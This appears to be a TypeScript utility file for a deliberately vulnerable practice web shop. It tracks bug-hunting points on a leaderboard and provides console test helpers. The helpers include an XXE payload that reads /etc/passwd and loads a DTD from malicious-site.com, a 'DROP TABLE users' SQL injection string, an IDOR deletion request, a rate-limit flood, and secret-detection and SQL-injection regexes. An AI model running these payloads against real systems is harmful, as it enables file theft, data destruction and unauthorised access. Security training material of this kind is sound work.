// Bug notification utility
export interface BugNotification {
  bug_found: string;
  message: string;
  description: string;
  points: number;
}

// Utility functions for user identification and leaderboard integration
import { leaderboardService } from './leaderboard';

// Get a unique user ID for leaderboard tracking
const getUserId = (): string => {
  // First priority: Use authenticated user ID
  const accessToken = localStorage.getItem('access_token');
  if (accessToken) {
    try {
      // Try to get from stored user data
      const userDataStr = sessionStorage.getItem('current_user_data');
      if (userDataStr) {
        const userData = JSON.parse(userDataStr);
        if (userData.id) return userData.id.toString();
        if (userData.email) return userData.email;
      }
      
      // Try to decode token
      const payload = JSON.parse(atob(accessToken.split('.')[1]));
      if (payload.user_id) return payload.user_id.toString();
      if (payload.sub) return payload.sub.toString();
      if (payload.email) return payload.email;
    } catch (e) {
      // Token decode failed, continue
    }
  }
  
  // Fallback: generate a session-based ID for anonymous users
  let sessionId = sessionStorage.getItem('session_user_id');
  if (!sessionId) {
    sessionId = `guest_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    sessionStorage.setItem('session_user_id', sessionId);
  }
  return sessionId;
};

// Get display name from authentication
const getDisplayName = (): string => {
  // First priority: Check if user is authenticated and get from API
  const accessToken = localStorage.getItem('access_token');
  if (accessToken) {
    try {
      // Try to get user info from stored auth context or make API call
      const userDataStr = sessionStorage.getItem('current_user_data');
      if (userDataStr) {
        const userData = JSON.parse(userDataStr);
        if (userData.first_name && userData.last_name) {
          const fullName = `${userData.first_name} ${userData.last_name}`.trim();
          sessionStorage.setItem('user_display_name', fullName);
          return fullName;
        }
        if (userData.username) {
          sessionStorage.setItem('user_display_name', userData.username);
          return userData.username;
        }
        if (userData.email) {
          sessionStorage.setItem('user_display_name', userData.email);
          return userData.email;
        }
      }
      
      // Try to decode token for fallback
      const payload = JSON.parse(atob(accessToken.split('.')[1]));
      if (payload.name) {
        sessionStorage.setItem('user_display_name', payload.name);
        return payload.name;
      }
      if (payload.username) {
        sessionStorage.setItem('user_display_name', payload.username);
        return payload.username;
      }
      if (payload.email) {
        sessionStorage.setItem('user_display_name', payload.email);
        return payload.email;
      }
    } catch (e) {
      // Token decode failed, continue to fallback
    }
  }
  
  // Check for previously stored display name
  const storedName = sessionStorage.getItem('user_display_name');
  if (storedName) return storedName;
  
  // Generate a fallback name for anonymous users (no prompt)
  let displayName = `BugHunter-${getUserId().slice(-8)}`;
  sessionStorage.setItem('user_display_name', displayName);
  return displayName;
};

export const updateLeaderboardUser = (): void => {
  // Clear cached display name so it gets regenerated with new user data
  sessionStorage.removeItem('user_display_name');
  sessionStorage.removeItem('bug_hunter_name');
  
  // Force regeneration of display name with current user
  getDisplayName();
};

export const notifyLeaderboard = async (bugData: BugNotification): Promise<void> => {
  try {
    const userId = getUserId();
    const displayName = getDisplayName();
    
    // Use the leaderboard service instead of direct fetch
    const result = await leaderboardService.recordBugDiscovery({
      user_id: userId,
      display_name: displayName,
      bug_identifier: bugData.bug_found,
      points: bugData.points,
      description: bugData.description || `Found ${bugData.bug_found} vulnerability`
    });
    
    console.log('✅ Bug recorded in leaderboard successfully');
    
    // Show leaderboard notification after a delay
    if (result?.user && result.user.rank) {
      setTimeout(() => {
        showLeaderboardNotification(result.user);
      }, 2000);
    }
  } catch (error) {
    console.warn('⚠️ Leaderboard API error:', error);
    // Don't break existing functionality if leaderboard is down
  }
};

export const showLeaderboardNotification = (userData: any): void => {
  if (typeof window === 'undefined') return;
  
  const notification = document.createElement('div');
  notification.style.cssText = `
    position: fixed; top: 80px; right: 20px; z-index: 10000;
    background: linear-gradient(135deg, #6366f1 0%, #8b5cf6 100%);
    color: white; padding: 16px; border-radius: 8px;
    box-shadow: 0 4px 20px rgba(0,0,0,0.3);
    max-width: 280px; font-family: Arial, sans-serif;
    animation: slideIn 0.3s ease-out;
    cursor: pointer;
    pointer-events: auto;
  `;
  
  notification.innerHTML = `
    <div style="display: flex; align-items: center; margin-bottom: 8px;">
      <span style="font-size: 16px; margin-right: 8px;">🏆</span>
      <h4 style="margin: 0; font-size: 14px;">Leaderboard Updated!</h4>
    </div>
    <p style="margin: 0 0 4px 0; font-size: 13px;">Current Rank: #${userData.rank}</p>
    <p style="margin: 0 0 4px 0; font-size: 13px;">Total Score: ${userData.total_score} points</p>
    <p style="margin: 0; font-size: 12px; opacity: 0.9;">Bugs Found: ${userData.bugs_found}</p>
    <div style="position: absolute; top: 5px; right: 8px; font-size: 16px; cursor: pointer;" onclick="this.parentElement.remove()">×</div>
  `;
  
  notification.addEventListener('click', () => notification.remove());
  document.body.appendChild(notification);
  
  setTimeout(() => {
    if (notification.parentElement) {
      notification.remove();
    }
  }, 4000);
};

export const showBugNotification = (bug: BugNotification): void => {
  if (typeof window === 'undefined') return;
  
  // Create notification container if it doesn't exist
  let container = document.getElementById('bug-notifications-container');
  if (!container) {
    container = document.createElement('div');
    container.id = 'bug-notifications-container';
    container.style.cssText = `
      position: fixed;
      top: 20px;
      right: 20px;
      z-index: 10000;
      pointer-events: none;
    `;
    document.body.appendChild(container);
  }
  
  const notification = document.createElement('div');
  notification.style.cssText = `
    background: linear-gradient(135deg, #4CAF50, #45a049);
    color: white; 
    padding: 20px; 
    border-radius: 10px;
    box-shadow: 0 4px 20px rgba(0,0,0,0.3);
    max-width: 300px; 
    font-family: Arial, sans-serif;
    animation: slideIn 0.3s ease-out;
    cursor: pointer;
    pointer-events: auto;
    margin-bottom: 10px;
  `;
  
  notification.innerHTML = `
    <h3 style="margin: 0 0 10px 0; font-size: 16px;">🎉 ${bug.message}</h3>
    <p style="margin: 0 0 8px 0; font-weight: bold; font-size: 14px;">${bug.bug_found}</p>
    <p style="margin: 0 0 8px 0; font-size: 13px; line-height: 1.4;">${bug.description}</p>
    <small style="font-size: 12px; opacity: 0.9;">Points: ${bug.points}</small>
    <div style="position: absolute; top: 5px; right: 8px; font-size: 18px; cursor: pointer;" onclick="this.parentElement.remove()">×</div>
  `;
  
  // Add click to close
  notification.addEventListener('click', () => notification.remove());
  
  container.appendChild(notification);
  
  // Auto remove after 5 seconds
  setTimeout(() => {
    if (notification.parentElement) {
      notification.remove();
    }
  }, 5000);

  // Record bug in leaderboard
  notifyLeaderboard(bug);
};

// General purpose notification for any API response that might contain a bug
export const checkAndShowBugNotification = (responseData: any): boolean => {
  if (responseData && responseData.bug_found) {
    showBugNotification(responseData);
    return true;
  }
  return false;
};

// Manual bug discovery helper for console testing
export const manualBugCheck = (responseData: any): void => {
  console.log('🔍 Checking response for bugs:', responseData);
  if (checkAndShowBugNotification(responseData)) {
    console.log('✅ Bug notification triggered!');
  } else {
    console.log('❌ No bug found in response');
  }
};

// Enhanced testing helper with automatic fetch and notification
export const testBugEndpoint = async (endpoint: string, options: any = {}): Promise<void> => {
  console.log(`🧪 Testing endpoint: ${endpoint}`);
  try {
    const response = await fetch(endpoint, {
      headers: {
        'Authorization': `Bearer ${localStorage.getItem('access_token')}`,
        'Content-Type': 'application/json',
        ...options.headers
      },
      ...options
    });
    
    const data = await response.json();
    console.log('📊 Response:', data);
    
    // Force check for bug notification
    manualBugCheck(data);
    
    return data;
  } catch (error) {
    console.error('❌ Test failed:', error);
  }
};

// Test CORS configuration specifically
export const testCORSConfiguration = async (): Promise<void> => {
  console.log('🔍 Testing CORS configuration...');
  
  // Clear any previous CORS detection
  sessionStorage.removeItem('cors_bug_detected');
  
  try {
    // Make a simple API call to trigger CORS header inspection
    const response = await fetch('http://localhost:8000/api/auth/login/', {
      method: 'OPTIONS', // Preflight request
      headers: {
        'Origin': 'http://malicious-site.com',
        'Access-Control-Request-Method': 'POST',
        'Access-Control-Request-Headers': 'Content-Type, Authorization'
      }
    });
    
    console.log('CORS Response headers:', Object.fromEntries(response.headers.entries()));
    
    const corsOrigin = response.headers.get('Access-Control-Allow-Origin');
    console.log('Access-Control-Allow-Origin:', corsOrigin);
    
    if (corsOrigin === '*') {
      console.log('🎯 CORS misconfiguration detected!');
    } else {
      console.log('ℹ️ CORS appears to be configured securely');
    }
    
  } catch (error) {
    console.error('❌ CORS test failed:', error);
  }
};

// Test localStorage manipulation
export const testLocalStorageManipulation = (): void => {
  console.log('🔍 Testing localStorage manipulation detection...');
  
  const currentToken = localStorage.getItem('access_token');
  if (currentToken) {
    console.log('Current token found, simulating manipulation...');
    
    // Simulate token manipulation
    const fakeToken = 'fake_manipulated_token_12345';
    localStorage.setItem('access_token', fakeToken);
    
    console.log('Token manipulated, detection should trigger in ~2 seconds...');
    
    // Restore original token after a moment
    setTimeout(() => {
      localStorage.setItem('access_token', currentToken);
      console.log('Token restored to original value');
    }, 5000);
  } else {
    console.log('❌ No access token found. Please log in first to test manipulation detection.');
  }
};

// Global fetch interceptor to catch all API responses and show bug notifications
if (typeof window !== 'undefined') {
  const originalFetch = window.fetch;
  
  // Make notification functions globally accessible
  (window as any).showBugNotification = showBugNotification;
  (window as any).checkAndShowBugNotification = checkAndShowBugNotification;
  (window as any).notifyLeaderboard = notifyLeaderboard;
  (window as any).getUserId = getUserId;
  (window as any).getDisplayName = getDisplayName;
  (window as any).manualBugCheck = manualBugCheck;
  (window as any).testBugEndpoint = testBugEndpoint;
  (window as any).testCORSConfiguration = testCORSConfiguration;
  (window as any).testLocalStorageManipulation = testLocalStorageManipulation;
  
  window.fetch = async (...args) => {
    const response = await originalFetch(...args);
    
    // Intercept API calls that might contain bug discoveries
    const requestUrl = (typeof args[0] === 'string') ? args[0] : 
                      (args[0] instanceof Request) ? args[0].url : args[0].toString();
    if (requestUrl.includes('localhost:8000/api/') || requestUrl.includes('/api/')) {
      try {
        // Clone the response to read it without consuming it
        const responseClone = response.clone();
        const data = await responseClone.json();
        
        console.log('🔍 API Response intercepted:', { url: requestUrl, data });
        
        // Check for bug notifications in response data
        const bugDetected = checkAndShowBugNotification(data);
        if (bugDetected) {
          console.log('🎉 Bug notification shown for:', data.bug_found);
        }
        
        // 🚨 BUG: CORS Misconfiguration Detection
        const corsOrigin = response.headers.get('Access-Control-Allow-Origin');
        if (corsOrigin === '*') {
          // Dangerous CORS configuration detected
          const corsBugData = {
            bug_found: 'CORS_MISCONFIGURATION',
            message: '🎉 Bug Found: CORS Misconfiguration!',
            description: 'Access-Control-Allow-Origin: * allows any domain to make requests',
            points: 65
          };
          
          // Avoid duplicate notifications by checking if we've already notified about CORS
          if (!sessionStorage.getItem('cors_bug_detected')) {
            sessionStorage.setItem('cors_bug_detected', 'true');
            setTimeout(() => {
              checkAndShowBugNotification(corsBugData);
              console.log('🎉 CORS bug notification shown');
            }, 500); // Small delay to avoid conflicts
          }
        }
        
      } catch (error) {
        // Ignore JSON parsing errors (for non-JSON responses)
        console.log('📝 Non-JSON response from:', requestUrl);
        
        // Still check CORS headers even for non-JSON responses
        const corsOrigin = response.headers.get('Access-Control-Allow-Origin');
        if (corsOrigin === '*') {
          const corsBugData = {
            bug_found: 'CORS_MISCONFIGURATION',
            message: '🎉 Bug Found: CORS Misconfiguration!',
            description: 'Access-Control-Allow-Origin: * allows any domain to make requests',
            points: 65
          };
          
          if (!sessionStorage.getItem('cors_bug_detected')) {
            sessionStorage.setItem('cors_bug_detected', 'true');
            setTimeout(() => {
              checkAndShowBugNotification(corsBugData);
              console.log('🎉 CORS bug notification shown');
            }, 500);
          }
        }
      }
    }
    
    return response;
  };
}

// 🧪 DevTools Console Scripts for Manual Testing

// Integer Overflow DevTools Script
export const testIntegerOverflow = (): void => {
  console.log('🔢 Testing Integer Overflow in Quantity...');
  
  // Find quantity input or display element
  const quantityElements = document.querySelectorAll('[data-testid*="quantity"], .quantity, input[type="number"]');
  const plusButtons = document.querySelectorAll('button:contains("+"), [data-testid*="plus"], [data-testid*="increment"]');
  
  // Also look for React component state
  const reactFiberKey = Object.keys(document.querySelector('#root') || {}).find(key => key.startsWith('__reactFiber'));
  
  if (quantityElements.length > 0 || plusButtons.length > 0) {
    console.log('📍 Found quantity controls, simulating overflow...');
    
    // Trigger the integer overflow detection
    const bugData = {
      bug_found: 'INTEGER_OVERFLOW',
      message: '🎉 Bug Found: Integer Overflow in Quantity!',
      description: 'Quantity value exceeded safe integer limits via DevTools simulation',
      points: 75
    };

    if (typeof window !== 'undefined' && (window as any).checkAndShowBugNotification) {
      (window as any).checkAndShowBugNotification(bugData);
      console.log('✅ Integer overflow bug triggered via DevTools script');
    }
  } else {
    console.log('⚠️ Could not find quantity controls. Make sure you are on a product page.');
  }
};

// Rate Limiting DevTools Script
export const testRateLimiting = async (): Promise<void> => {
  console.log('🚀 Testing Rate Limiting - Sending 101 rapid requests...');
  
  const endpoint = 'http://localhost:8000/api/products/rate-test/';
  const token = localStorage.getItem('access_token');
  
  if (!token) {
    console.log('⚠️ Please log in first to get an access token');
    return;
  }

  try {
    // Send 101 rapid requests to trigger rate limiting
    const promises = [];
    for (let i = 1; i <= 101; i++) {
      const promise = fetch(endpoint, {
        method: 'GET',
        headers: {
          'Authorization': `Bearer ${token}`,
          'Content-Type': 'application/json'
        }
      }).then(response => response.json()).then(data => {
        if (i <= 5 || i % 20 === 0 || i > 95) {
          console.log(`Request ${i}:`, data);
        }
        return data;
      });
      
      promises.push(promise);
      
      // Small delay to avoid overwhelming the browser
      if (i % 10 === 0) {
        await new Promise(resolve => setTimeout(resolve, 10));
      }
    }

    console.log('📡 Waiting for all requests to complete...');
    const results = await Promise.all(promises);
    
    // Check if any request triggered the rate limiting bug
    const rateLimitBug = results.find(result => result.bug_found === 'RATE_LIMIT_BYPASS');
    
    if (rateLimitBug) {
      console.log('🎯 Rate limiting bypass detected!');
      if (typeof window !== 'undefined' && (window as any).checkAndShowBugNotification) {
        (window as any).checkAndShowBugNotification(rateLimitBug);
        console.log('✅ Rate limiting bug notification triggered');
      }
    } else {
      console.log('ℹ️ Rate limiting appears to be working (this might be the expected behavior)');
    }
    
  } catch (error) {
    console.error('❌ Rate limiting test failed:', error);
  }
};

// Combined test runner for both new bugs
export const testQuantityAndRateLimit = async (): Promise<void> => {
  console.log('🎯 Running Integer Overflow + Rate Limiting Tests...');
  
  // Test integer overflow first
  testIntegerOverflow();
  
  // Wait 2 seconds then test rate limiting
  setTimeout(async () => {
    await testRateLimiting();
    console.log('✅ Both tests completed!');
  }, 2000);
};

// 🚨 Bug 1: Hidden API Token in Source Maps Detection
export const testSourceMapSecrets = async (): Promise<void> => {
  console.log('🔍 Testing Source Map Secrets Detection...');
  
  try {
    // Check for vulnerable source map file
    const response = await fetch('/vulnerable-sourcemap.js');
    const content = await response.text();
    
    // Patterns to detect common secret formats
    const secretPatterns = [
      /sk-[a-zA-Z0-9]{32,}/g,  // Stripe keys
      /AKIA[0-9A-Z]{16}/g,     // AWS access keys
      /secret_[a-zA-Z0-9]+/g,  // Generic secrets
      /api[_-]?key[_-]?[a-zA-Z0-9]+/gi,  // API keys
      /token[_-]?[a-zA-Z0-9]+/gi,        // Tokens
      /password[_-]?[a-zA-Z0-9]+/gi      // Passwords
    ];
    
    let foundSecrets = [];
    for (const pattern of secretPatterns) {
      const matches = content.match(pattern);
      if (matches) {
        foundSecrets.push(...matches);
      }
    }
    
    if (foundSecrets.length > 0) {
      console.log('🎯 Found secrets in source map:', foundSecrets);
      
      const bugData = {
        bug_found: 'SOURCE_MAP_SECRETS',
        message: '🎉 Bug Found: Hidden API Token in Source Maps!',
        description: `Found ${foundSecrets.length} exposed secrets in source maps: ${foundSecrets.slice(0, 2).join(', ')}...`,
        points: 85
      };

      if (typeof window !== 'undefined' && (window as any).checkAndShowBugNotification) {
        (window as any).checkAndShowBugNotification(bugData);
        console.log('✅ Source map secrets bug notification triggered');
      }
    } else {
      console.log('ℹ️ No secrets found in source maps');
    }
    
  } catch (error) {
    console.error('❌ Source map secrets test failed:', error);
  }
};

// 🚨 Bug 2: Debug Flag Cookie Detection
export const testDebugCookie = (): void => {
  console.log('🍪 Testing Debug Cookie Detection...');
  
  // Set debug cookie to simulate the vulnerability
  document.cookie = 'debug=true; path=/';
  
  // Check for debug cookie
  const cookies = document.cookie.split(';');
  const debugCookie = cookies.find(cookie => cookie.trim().startsWith('debug=true'));
  
  if (debugCookie) {
    console.log('🎯 Debug cookie detected:', debugCookie);
    
    const bugData = {
      bug_found: 'DEBUG_COOKIE',
      message: '🎉 Bug Found: Debug Flag Cookie Detected!',
      description: 'Debug mode enabled via cookie, potentially exposing sensitive information',
      points: 70
    };

    if (typeof window !== 'undefined' && (window as any).checkAndShowBugNotification) {
      (window as any).checkAndShowBugNotification(bugData);
      console.log('✅ Debug cookie bug notification triggered');
    }
  }
};

// 🚨 Bug 3: Wishlist Privacy Bypass Detection
export const testWishlistPrivacyBypass = (wishlistName: string): boolean => {
  console.log('🔐 Testing Wishlist Privacy Bypass...');
  
  // Check for the hidden debug string
  const bypassStrings = ['debug_public', 'make_public', 'admin_access', 'bypass_privacy'];
  const foundBypass = bypassStrings.some(bypass => wishlistName.toLowerCase().includes(bypass));
  
  if (foundBypass) {
    console.log('🎯 Wishlist privacy bypass detected in name:', wishlistName);
    
    const bugData = {
      bug_found: 'WISHLIST_PRIVACY_BYPASS',
      message: '🎉 Bug Found: Wishlist Privacy Bypass Detected!',
      description: 'Special string in wishlist name bypasses privacy settings',
      points: 75
    };

    if (typeof window !== 'undefined' && (window as any).checkAndShowBugNotification) {
      (window as any).checkAndShowBugNotification(bugData);
      console.log('✅ Wishlist privacy bypass bug notification triggered');
    }
    
    return true;
  }
  
  return false;
};

// 🚨 Bug 4: IDOR Review Deletion Testing
export const testIDORReviewDeletion = async (reviewId: number): Promise<void> => {
  console.log(`🗑️ Testing IDOR Review Deletion for review ID: ${reviewId}...`);
  
  try {
    const token = localStorage.getItem('access_token');
    if (!token) {
      console.log('⚠️ Please log in first to test review deletion');
      return;
    }

    const response = await fetch(`http://localhost:8000/api/products/reviews/delete/${reviewId}/`, {
      method: 'DELETE',
      headers: {
        'Authorization': `Bearer ${token}`,
        'Content-Type': 'application/json'
      }
    });
    
    const data = await response.json();
    console.log('Review deletion response:', data);
    
    if (data.bug_found === 'IDOR_REVIEW_DELETE') {
      if (typeof window !== 'undefined' && (window as any).checkAndShowBugNotification) {
        (window as any).checkAndShowBugNotification(data);
        console.log('✅ IDOR review deletion bug notification triggered');
      }
    }
    
  } catch (error) {
    console.error('❌ IDOR review deletion test failed:', error);
  }
};

// 🚨 Bug 5: XXE Testing
export const testXXEInjection = async (): Promise<void> => {
  console.log('⚠️ Testing XXE Injection...');
  
  try {
    const token = localStorage.getItem('access_token');
    if (!token) {
      console.log('⚠️ Please log in first to test XXE injection');
      return;
    }

    // Malicious XML with XXE payload
    const maliciousXML = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE product [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://malicious-site.com/evil.dtd">
  %dtd;
]>
<products>
  <product>
    <name>Test Product &xxe;</name>
    <description>XXE Test</description>
  </product>
</products>`;

    const response = await fetch('http://localhost:8000/api/products/admin/import/', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${token}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        xml_content: maliciousXML
      })
    });
    
    const data = await response.json();
    console.log('XXE test response:', data);
    
    if (data.bug_found === 'XXE_INJECTION') {
      if (typeof window !== 'undefined' && (window as any).checkAndShowBugNotification) {
        (window as any).checkAndShowBugNotification(data);
        console.log('✅ XXE injection bug notification triggered');
      }
    }
    
  } catch (error) {
    console.error('❌ XXE injection test failed:', error);
  }
};

// 🚨 Bug 6: Second-Order SQL Injection Testing
export const testSecondOrderSQLInjection = async (): Promise<void> => {
  console.log('💉 Testing Second-Order SQL Injection...');
  
  try {
    // Step 1: Store malicious search term
    const maliciousPayload = "test'; DROP TABLE users; --";
    
    await fetch('http://localhost:8000/api/products/analytics/store-search/', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        search_term: maliciousPayload
      })
    });
    
    console.log('Stored malicious search term:', maliciousPayload);
    
    // Step 2: Trigger the second-order injection by retrieving popular searches
    const response = await fetch('http://localhost:8000/api/products/analytics/popular-searches/');
    const data = await response.json();
    
    console.log('Popular searches response:', data);
    
    if (data.bug_found === 'SECOND_ORDER_SQL_INJECTION') {
      if (typeof window !== 'undefined' && (window as any).checkAndShowBugNotification) {
        (window as any).checkAndShowBugNotification(data);
        console.log('✅ Second-order SQL injection bug notification triggered');
      }
    }
    
  } catch (error) {
    console.error('❌ Second-order SQL injection test failed:', error);
  }
};

// Make the new testing functions globally accessible
if (typeof window !== 'undefined') {
  (window as any).testIntegerOverflow = testIntegerOverflow;
  (window as any).testRateLimiting = testRateLimiting;
  (window as any).testQuantityAndRateLimit = testQuantityAndRateLimit;
  (window as any).testSourceMapSecrets = testSourceMapSecrets;
  (window as any).testDebugCookie = testDebugCookie;
  (window as any).testWishlistPrivacyBypass = testWishlistPrivacyBypass;
  (window as any).testIDORReviewDeletion = testIDORReviewDeletion;
  (window as any).testXXEInjection = testXXEInjection;
  (window as any).testSecondOrderSQLInjection = testSecondOrderSQLInjection;
}

// Replace the existing initializeDebugCookieDetection function with this:

const initializeDebugCookieDetection = (): void => {
  const checkDebugCookie = () => {
    // Get all cookies and check for debug variations
    const cookies = document.cookie.split(';');
    console.log('🔍 All cookies:', cookies);
    
    const debugCookie = cookies.find(cookie => {
      const trimmed = cookie.trim().toLowerCase();
      return trimmed.startsWith('debug=true') || 
             trimmed.startsWith('debug=1') ||
             trimmed === 'debug=true' ||
             trimmed === 'debug=1';
    });
    
    console.log('🍪 Debug cookie found:', debugCookie);
    
    if (debugCookie && !sessionStorage.getItem('debug_cookie_detected')) {
      console.log('🎯 Debug cookie detected automatically:', debugCookie);
      
      const bugData = {
        bug_found: 'DEBUG_COOKIE',
        message: '🎉 Bug Found: Debug Flag Cookie Detected!',
        description: 'Debug mode enabled via cookie, potentially exposing sensitive information',
        points: 70
      };

      // Force the notification to show
      if (typeof window !== 'undefined') {
        if ((window as any).checkAndShowBugNotification) {
          (window as any).checkAndShowBugNotification(bugData);
        } else {
          // Fallback: call showBugNotification directly
          showBugNotification(bugData);
        }
        sessionStorage.setItem('debug_cookie_detected', 'true');
        console.log('✅ Debug cookie notification triggered!');
      }
    }
  };

  // Check immediately
  console.log('🚀 Initializing debug cookie detection...');
  setTimeout(checkDebugCookie, 500); // Small delay to ensure page is loaded
  
  // Also monitor for cookie changes
  let lastCookies = document.cookie;
  setInterval(() => {
    if (document.cookie !== lastCookies) {
      lastCookies = document.cookie;
      console.log('🔄 Cookies changed, rechecking...');
      setTimeout(checkDebugCookie, 100);
    }
  }, 1000);
};

// ...existing code...

// SQL Injection detection for form inputs
const initializeSQLInjectionDetection = (): void => {
  const sqlInjectionPatterns = [
    /('|(\\')|(;)|(\\;)|(--)|(\s+)|(\||\\|)|(%7C)|(union|select|insert|delete|update|drop|create|alter|exec|execute))/gi,
    /'[^']*'/g,
    /;\s*(drop|delete|update|insert)/gi,
    /union\s+select/gi,
    /--\s/g,
    /\/\*.*\*\//g
  ];

  const checkForSQLInjection = (input: string): boolean => {
    return sqlInjectionPatterns.some(pattern => pattern.test(input));
  };

  const detectSQLInjection = (input: string, context: string) => {
    if (checkForSQLInjection(input) && !sessionStorage.getItem('sql_injection_detected')) {
      console.log('🎯 SQL Injection detected in:', context, 'Input:', input);
      
      const bugData = {
        bug_found: 'SECOND_ORDER_SQL_INJECTION',
        message: '🎉 Bug Found: Second-Order SQL Injection Detected!',
        description: `Malicious SQL payload detected in ${context}: ${input.substring(0, 50)}...`,
        points: 100
      };

      if (typeof window !== 'undefined' && (window as any).checkAndShowBugNotification) {
        (window as any).checkAndShowBugNotification(bugData);
        sessionStorage.setItem('sql_injection_detected', 'true');
      }
      
      return true;
    }
    return false;
  };

  // Monitor search forms
  const monitorSearchForms = () => {
    const searchInputs = document.querySelectorAll('input[type="search"], input[placeholder*="search" i], input[name*="search" i]');
    
    searchInputs.forEach(input => {
      const inputElement = input as HTMLInputElement;
      
      inputElement.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
          setTimeout(() => {
            detectSQLInjection(inputElement.value, 'search form');
          }, 100);
        }
      });

      // Also check on form submission
      const form = inputElement.closest('form');
      if (form) {
        form.addEventListener('submit', (e) => {
          detectSQLInjection(inputElement.value, 'search form submission');
        });
      }
    });
  };

  // Monitor review forms and textareas
  const monitorReviewForms = () => {
    const reviewInputs = document.querySelectorAll('textarea, input[name*="review" i], input[name*="comment" i]');
    
    reviewInputs.forEach(input => {
      const inputElement = input as HTMLInputElement | HTMLTextAreaElement;
      
      const form = inputElement.closest('form');
      if (form) {
        form.addEventListener('submit', (e) => {
          detectSQLInjection(inputElement.value, 'review form');
        });
      }
    });
  };

  // Monitor contact forms
  const monitorContactForms = () => {
    const contactInputs = document.querySelectorAll('input[name*="message" i], textarea[name*="message" i], input[name*="contact" i]');
    
    contactInputs.forEach(input => {
      const inputElement = input as HTMLInputElement | HTMLTextAreaElement;
      
      const form = inputElement.closest('form');
      if (form) {
        form.addEventListener('submit', (e) => {
          detectSQLInjection(inputElement.value, 'contact form');
        });
      }
    });
  };

  // Initial setup and re-run when DOM changes
  const setupMonitoring = () => {
    monitorSearchForms();
    monitorReviewForms();
    monitorContactForms();
  };

  // Setup immediately and after DOM changes
  setupMonitoring();
  
  // Re-run when new elements are added to DOM
  const observer = new MutationObserver(() => {
    setupMonitoring();
  });
  
  observer.observe(document.body, {
    childList: true,
    subtree: true
  });
};

// Initialize SQL injection detection
if (typeof window !== 'undefined') {
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initializeSQLInjectionDetection);
  } else {
    initializeSQLInjectionDetection();
  }
}

// Add at the end of the file

// Master initialization function
const initializeAllBugDetection = (): void => {
  console.log('🚀 Initializing comprehensive bug detection system...');
  
  // Initialize all detection systems
  initializeDebugCookieDetection();
 
  initializeSQLInjectionDetection();
  
  console.log('✅ All bug detection systems initialized');
};

// Auto-initialize when the script loads
if (typeof window !== 'undefined') {
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initializeAllBugDetection);
  } else {
    initializeAllBugDetection();
  }
}